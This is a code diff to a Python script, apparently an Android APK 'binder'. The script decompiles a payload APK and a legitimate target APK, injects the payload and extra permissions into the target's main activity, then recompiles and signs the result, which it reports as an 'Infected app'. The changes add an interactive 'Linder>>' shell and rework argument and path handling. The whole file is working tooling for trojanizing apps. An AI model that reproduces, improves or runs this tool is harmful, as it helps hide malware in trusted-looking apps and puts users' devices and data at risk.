@@ -25,13 +25,22 @@ else:
 	mv = 'mv'
 	rm = 'rm -rf'
 
-global package, package_name, package_name_path, smali_loc, smali_path,P1,Termux_Bool
+global package, package_name, package_name_path, smali_loc, smali_path,P1
 
-input_apk=""
-output_apk=""
-payload_apk=""
 
-Termux_Bool = os.path.exists("/data/data/com.termux/files/home")
+payload_input = 'Not set'
+original_input = 'Not set'
+final_path = 'Not set'
+interactive=False
+
+def Termux_Bool():
+	try:
+		if 'termux' in os.environ['HOME']:
+			return True
+		else:
+			return False
+	except KeyError:
+		return False
 
 def err_msg(msg):
     print(RED + "[!] " + msg + WHITE)
@@ -76,40 +85,36 @@ def Update():
 			print_status(BLUE + "Please Restart The Script...")
 			exit()
 def Usage():
-	print(RED+"\n\t\tUsage:"+WHITE)
-	print(GREEN+"\nInterface Mode: \n\n"+WHITE)
-	print(YELLOW+f"python3 {sys.argv[0]}\n")
-	print(GREEN+"\nCommand Line Mode: \n\n"+WHITE)
 	print(YELLOW + 'python3 %s <payload.apk> <target.apk> <output.apk> \n' % (str(sys.argv[0])))
-	print(GREEN+"\nTo UPDATE: \n\n"+WHITE)
-	print(YELLOW+f"python3 {sys.argv[0]} --update\n"+WHITE)
+	print('\n' + YELLOW + 'pass the ' + BLUE + "--update" + YELLOW + " parameter to update.\n" + WHITE)
 	exit()
 
 # Getting payload apk name
 
 def PN():
-	if '/' in str(payload_apk):
-		tmp = str(payload_apk).split('/')
+	if '/' in payload_input:
+		tmp = payload_input.split('/')
 		name = tmp[len(tmp) - 1]
 		return str(name)
 	else:
-		return str(payload_apk)
+		return payload_input
 
 # Getting original apk name
 
 def ON():
-	if '/' in input_apk:
-		tmp = input_apk.split('/')
+	if '/' in original_input:
+		tmp = original_input.split('/')
 		name = tmp[len(tmp) - 1]
 		return name
 	else:
-		return str(input_apk)
+		return original_input
 
 
 
 # Finding main activity smali
 
 def findA(xml):
+	Android = ''
 	with open(xml,'r') as f:
 		dom = parseString(f.read())
 		activities = dom.getElementsByTagName('activity')
@@ -119,8 +124,9 @@ def findA(xml):
 				actions = intent.getElementsByTagName('action')
 				for action in actions:
 					if action.getAttribute('android:name') == 'android.intent.action.MAIN':
-						return activity.getAttribute('android:name')
-	
+						Android += activity.getAttribute('android:name') + '\n'
+						break
+	return Android.split('\n')[0]
 
 # If couldnt find path of activity, then joining the package name and activity name to get the activity path
 
@@ -194,7 +200,7 @@ def newsmali(contents,targetstring):
 
 def Bind():
 	try:
-		global out,Termux_Bool
+		global out
 		Perms_List = ['<uses-permission android:name="android.permission.INTERNET"/>',
                         '<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>',
                         '<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>',
@@ -241,8 +247,8 @@ def Bind():
 		except:
 			pass
 		print_status("Copying APKs...")
-		subprocess.call(cp + ' ' +  str(payload_apk) + " TempP", shell=True)
-		subprocess.call(cp + ' ' + str(input_apk) + " TempP", shell=True)
+		subprocess.call(cp + ' ' +  payload_input + " TempP", shell=True)
+		subprocess.call(cp + ' ' + original_input + " TempP", shell=True)
 
 		print_status("done.")
 
@@ -250,7 +256,7 @@ def Bind():
 
 		print_status("Decompiling APKs...\n")
 		os.chdir("TempP/")
-		if Termux_Bool:
+		if Termux_Bool():
 			os.system('apkmod -d %s -o %s' % (original,original.replace('.apk','')))
 			os.system('apkmod -d %s -o %s' % (payload,payload.replace('.apk','')))
 		else:
@@ -334,22 +340,22 @@ def Bind():
 
 		print_status('Compiling Infected APK...\n')
 
-		if Termux_Bool:
+		if Termux_Bool():
 			subprocess.call("apkmod -r %s -o fin_out.apk" % (original.replace('.apk','')),shell=True)
 			os.chdir('../')
 		else:
-			subprocess.call("apktool b %s -o %s -f" % (original.replace('.apk',''),output_apk),shell=True)
-			subprocess.call(mv + ' '+ output_apk + ' ..',shell=True)
+			subprocess.call("apktool b %s -o %s -f" % (original.replace('.apk',''),str(final_path)),shell=True)
+			subprocess.call(mv + ' '+ str(final_path) + ' ..',shell=True)
 			os.chdir('../')
 		print_status('Signing Infected APK...\n')
-		if Termux_Bool:
-			subprocess.call("apkmod -s TempP/fin_out.apk -o %s" % (output_apk),shell=True)
-			print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (output_apk,str(os.path.getsize(output_apk))) + WHITE)	
+		if Termux_Bool():
+			subprocess.call("apkmod -s TempP/fin_out.apk -o %s" % (str(final_path)),shell=True)
+			print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (str(final_path),str(os.path.getsize(str(final_path)))) + WHITE)	
 			subprocess.call(rm + " TempP",shell=True)
 			exit()
 		else:
-			subprocess.call("apksigner sign --ks release.keystore --ks-pass pass:lmaolmfao %s" % (output_apk),shell=True)
-		print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (output_apk,str(os.path.getsize(output_apk))) + WHITE)
+			subprocess.call("apksigner sign --ks release.keystore --ks-pass pass:lmaolmfao %s" % (str(final_path)),shell=True)
+		print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (str(final_path),str(os.path.getsize(str(final_path)))) + WHITE)
 		subprocess.call(rm + " TempP",shell=True)
 		exit()
 	except (UnicodeDecodeError) as e:
@@ -359,24 +365,146 @@ def Bind():
 	except Exception as e:
 		subprocess.call(rm + ' TempP',shell=True)
 		err_msg("ERROR OCCURED! EXITING...")
-		print('\n' + str(e))
+		print('\n' + str(e.args))
 		exit()
+
+def pathcheck(b,par):
+	global final_path
+	a = ''
+	delim = ''
+	if '/' in b:
+		delim='/'
+	elif '\\' in b:
+		delim='\\'
+	else:
+		final_path=b
+		if par == 'interactive':
+				print('output ==> ' + final_path)
+	if delim == '':
+		if par == 'interactive':
+				print('output ==> ' + final_path)
+		final_path=b
+	else:
+		for i in b.split(delim):
+			if i == '':
+				a += delim
+			elif '.apk' in i:
+				pass
+			else:
+				a+=i+delim
+		if os.path.exists(a):
+			final_path=b
+			if par == 'interactive':
+				print('output ==> ' + final_path)
+		else:
+			err_msg('Output path specified does not exists')
+			if par!='interactive':
+				exit()
+			pass
+
+
+class Interactive:
+	def __init__(self):
+		pass
+
+	def SetCMD(self,option,value):
+		global payload_input,original_input,final_path
+		if option.lower() == 'payload':
+			if os.path.isfile(value):
+				payload_input = value
+				print("Payload ==> "+value)
+			else:
+				err_msg("Invalid path. '%s': does not exists." % (value))
+		elif option.lower() == 'original':
+			if os.path.isfile(value):
+				original_input = value
+				print("Original ==> "+value)
+			else:
+				err_msg("Invalid path. '%s': does not exists." % (value))
+		elif option.lower() == 'output':
+			pathcheck(value,'interactive')
+
+		else:
+			err_msg("Invalid option selected")
+
+	def usage(self):
+		print('''
+
+----LIST OF COMMANDS-----
+
+----COMMAND     	ACTION-------
+
+[+] set 		set options [set <option> <value>]
+
+[+] options		show values for all options
+
+[+] bind 		start binding
+
+[+] clear		clear the screen
+
+[+] update 		update the script
+
+[+] help        show this help message
+
+[+] exit		Does what it says...
+''')
+
+	def clear(self):
+		if os.name == 'nt':
+			print(subprocess.getoutput('cls'))
+		else:
+			print(subprocess.getoutput('clear'))
+
+
+	def Start(self):
+		global payload_input,original_input,final_path
+		while True:
+			void = input(YELLOW + "Linder>> " + WHITE)
+			if 'set' in void and len(void.split(' ')) == 3:
+				self.SetCMD(void.split(' ')[1],void.split(' ')[2])
+			elif void.lower() == 'bind':
+				if payload_input!='Not set' and original_input!='Not set' and final_path!='Not set':
+					Bind()
+				else:
+					err_msg("Some option(s) are not set.")
+			elif void.lower() == 'exit':
+				exit()
+			elif void.lower() == 'help':
+				self.usage()
+			elif void.lower() == 'clear':
+				self.clear()
+			elif void.lower() == 'update':
+				if isOnline():
+					Update()
+				else:
+					err_msg('Please turn ON your data connection')
+			elif void.lower() == 'options':
+				print('Payload = '+payload_input)
+				print('Original = ' +original_input)
+				print('Output = '+final_path)
+			else:
+				err_msg('Invalid Command')
+
 
 # Checking whether APKTOOL & APKSIGNER are installed or not.
 
 def main():
+	global interactive
 	print_status("Checking whether APKTOOL is installed or not...")
 	if shutil.which('apktool') == None:
 		err_msg("ERROR: " + WHITE + "APKTOOL is not installed or not in path. Exiting.")
 		exit()
 	else:
 		print(GREEN + "INSTALLED" + WHITE)
-	if Termux_Bool:
+	if Termux_Bool():
 		if shutil.which('apkmod')==None:
 			err_msg("ERROR: " + WHITE + "Please run " + GREEN + "termux-setup.sh" + WHITE + " to install dependencies.")
 			exit()
 		else:
-			argscheck()
+			if interactive:
+				Interactive().Start()
+			else:
+				Bind()
 	print_status("Checking whether APKSIGNER is installed or not...")
 	if shutil.which('apksigner')==None:
 		err_msg("\nERROR: " + WHITE + "APKSIGNER is not installed or not in path. Exiting")
@@ -384,54 +512,31 @@ def main():
 	else:
 		print(GREEN + "INSTALLED" + WHITE)
 	print_status(YELLOW + "ALL OK, Checking args...\n\n")
-	argscheck()
-
-def pathcheck(op):
-	a = ''
-	delim = ''
-	if '/' in op:
-		delim='/'
-	elif '\\' in op:
-		delim='\\'
-	if delim!= '':
-		fop=''
-		if os.path.exists(delim.join(op.split(delim)[:-1])):
-			if os.path.isdir(op):
-				if op.endswith(delim):
-					fop=op+"infected.apk"
-				else:
-					fop=op+delim+"infected.apk"
-			elif os.path.isfile(op):
-				fop=op
-			else:
-				fop=os.getcwd()+"infected.apk"
-		else:
-				fop=os.getcwd()+"infected.apk"
+	if interactive:
+		Interactive().Start()
 	else:
-		if op.endswith('.apk'):
-			fop=os.getcwd()+op
-		else:
-			fop=os.getcwd()+op+".apk"
-	print(f"{GREEN}Infected APK TO BE Saved At: {RED}{fop}{WHITE}")
-	return fop
+		Bind()
+
 
 # This is self explanatory.
 
 def argscheck():
-	global input_apk,output_apk,payload_apk
+	global interactive,payload_input,original_input,final_path
 	if len(sys.argv) == 4:
 		if os.path.isfile(str(sys.argv[1])) and os.path.isfile(str(sys.argv[2])):
 			if not '.apk' in sys.argv[3]:
 				err_msg('Output APK name not specified')
 				exit()
-			output_apk=pathcheck(sys.argv[3])
-			payload_apk=sys.argv[1]
-			input_apk=sys.argv[2]
+			pathcheck(sys.argv[3],'null')
+			payload_input=sys.argv[1]
+			original_input=sys.argv[2]
+			final_path=sys.argv[3]
+			main()
 		else:
 			err_msg('APK(s) specified are not found!')
 			exit()
 	elif len(sys.argv) == 2:
-		if sys.argv[1] == '--update' or sys.argv[1]=="-u":
+		if str(sys.argv[1]) == '--update':
                         if isOnline():
                             Update()
                         else:
@@ -439,27 +544,9 @@ def argscheck():
                             exit()
 		else:
 			Usage()
-	elif len(sys.argv)==1:
-		#Interactive Mode
-		while True:
-			print(f"{BLUE}Started Interactive Mode{WHITE}")
-			print(f"{GREEN}Press {RED}CTRL+Z{GREEN} To Exit{WHITE}")
-			pp=input(f"{RED}Enter Path Of PAYLOAD APK: {GREEN}")
-			tp=input(f"{RED}Enter Path Of TARGET APK: {GREEN}")
-			if not( os.path.isfile(pp) and os.path.isfile(tp) ):
-				err_msg('APK(s) specified are not found!')
-				print(f"{RED}TRY AGAIN !!!{WHITE}")
-				continue
-			op=input(f"{RED}Enter Path To Write OUTPUT APK: {GREEN}")
-			output_apk=pathcheck(op)
-			payload_apk=pp
-			input_apk=tp
-			input(f"{BLUE}Press{RED} ENTER {BLUE} To Continue...")
-			Bind()
-			break
 	else:
-		err_msg("Not enough arguments passed. See help:-\n")
-		Usage()
+		interactive=True
+		main()
 
 
 # Lol
@@ -475,4 +562,4 @@ if not os.path.isfile("release.keystore"):
 	err_msg("\nERROR: keystore file not found. EXITING...")
 	exit()
 else:
-	main()
+	argscheck()
